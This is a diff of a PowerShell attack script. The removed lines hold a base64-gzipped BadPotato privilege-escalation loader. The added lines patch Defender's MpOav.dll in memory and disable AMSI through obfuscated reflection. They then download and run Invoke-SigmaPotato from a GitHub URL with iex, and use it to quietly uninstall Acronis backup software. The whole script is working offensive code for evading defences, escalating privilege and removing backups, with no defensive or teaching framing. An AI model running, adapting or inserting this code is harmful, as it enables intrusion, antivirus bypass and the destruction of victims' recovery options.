@@ -1,26 +1,72 @@
-function Invoke-BadPotato
-{
-
-    [CmdletBinding()]
-    Param (
-        [String]
-        $Command = "whoami"
-
+function Get-ProcAddress {
+    Param(
+        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
+        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
     )
-    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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"))
-    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
-    $output = New-Object System.IO.MemoryStream
-    $decompressed.CopyTo( $output )
-    [byte[]] $byteOutArray = $output.ToArray()
-    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
-    
-    $OldConsoleOut = [Console]::Out
-    $StringWriter = New-Object IO.StringWriter
-    [Console]::SetOut($StringWriter)
 
-    [ConsoleApp1.Program]::main($Command)
-
-    [Console]::SetOut($OldConsoleOut)
-    $Results = $StringWriter.ToString()
-    $Results
+    # Get a reference to System.dll in the GAC
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    # Get a reference to the GetModuleHandle and GetProcAddress methods
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
+    # Get a handle to the module specified
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+    # Return the address of the function
+    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 }
+function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])]
+            
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (New-Object Type[](0)),
+            
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+        
+    Write-Output $TypeBuilder.CreateType()
+}
+$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
+$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
+$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
+$LoadLibraryDelegate)
+$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
+$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
+$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
+$GetProcAddressDelegate)
+$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
+$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
+$VirtualProtectDelegate)
+
+$hModule = $LoadLibrary.Invoke("MpOav.dll")
+$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule,
+"DllGetClassObject")
+$p = 0
+$VirtualProtect.Invoke($DllGetClassObjectAddress, [uint32]6, 0x40, [ref]$p) 
+$ret_minus = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($ret_minus, 0, $DllGetClassObjectAddress, 6)
+$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
+$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
+$Uninitialize.Invoke($object,$null)
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
+Invoke-SigmaPotato -command "c:\program files\common files\acronis\backupandrecovery\Uninstaller.exe --quiet"
